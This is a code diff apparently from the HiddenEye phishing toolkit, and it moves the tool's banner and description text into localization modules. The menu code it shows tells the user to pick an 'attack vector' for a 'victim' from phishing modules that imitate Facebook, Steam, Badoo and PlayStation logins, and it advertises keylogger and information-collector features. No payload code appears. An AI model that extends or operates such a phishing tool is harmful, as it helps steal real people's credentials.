@@ -1,29 +1,23 @@
 from Defs.ImportManager.unsorted_will_be_replaced import run_command, webpage_set, wait, path, rmtree, pathlib_Path, copyfile, chmod, mkdir, remove
 import Defs.ThemeManager.theme as theme
 import Defs.ActionManager.simple_informant as simple_informant
-
+import Defs.LocalizationManager.lang_action_manager.lang_main_runner as localization
+import Defs.LocalizationManager.lang_global_usage as global_localization
 import os
 
 default_palette = theme.default_palette
 module_loading_message = simple_informant.module_loading_message
 
 
+
+
 def start_main_menu():
     run_command('clear')
-    with open('version.txt') as f:
-        ver_current = f.read()
-        version = ver_current.strip()
-    print('''
-
- {1} ██   ██ ██ ██████   ██████   ███████ ███   ██  {2}███████ ██    ██ ███████ {0}
- {1} ██   ██ ██ ██    ██ ██    ██ ██      ████  ██  {2}██       ██  ██  ██      {0}
- {1} ███████ ██ ██    ██ ██    ██ ███████ ██ ██ ██  {2}███████   ████   ███████ {0}
- {1} ██   ██ ██ ██    ██ ██    ██ ██      ██  ████  {2}██         ██    ██      {0}
- {1} ██   ██ ██ ██████   ██████   ███████ ██   ███  {2}███████    ██    ███████ {0}
-                                                      {2}[{0}v {3}{2}]{0} BY:DARKSEC{1}
-             {2}[{1} Modern Phishing Tool With Advanced Functionality {2}]
-{2}[{1} PHISHING-KEYLOGGER-INFORMATION COLLECTOR-ALL_IN_ONE_TOOL-SOCIALENGINEERING {2}]
-________________________________________________________________________________'''.format(default_palette[4], default_palette[2], default_palette[0], version))
+    print(global_localization.hidden_eye_logo)
+    print(localization.lang_start_main_menu["version_by_darksec"])
+    print(localization.lang_start_main_menu["short_description"])
+    print(localization.lang_start_main_menu["features_summary"])
+    print(localization.lang_start_main_menu["down_line"])
     print("------------------------\nSELECT ANY ATTACK VECTOR FOR YOUR VICTIM:\n------------------------")
     print("\n{0}PHISHING-MODULES:".format(default_palette[0]))
     print(" {0}[{1}01{0}]{1} Facebook       {0}[{1}13{0}]{1} Steam          {0}[{1}25{0}]{1} Badoo           {0}[{1}37{0}]{1} PlayStation".format(default_palette[0], default_palette[2]))
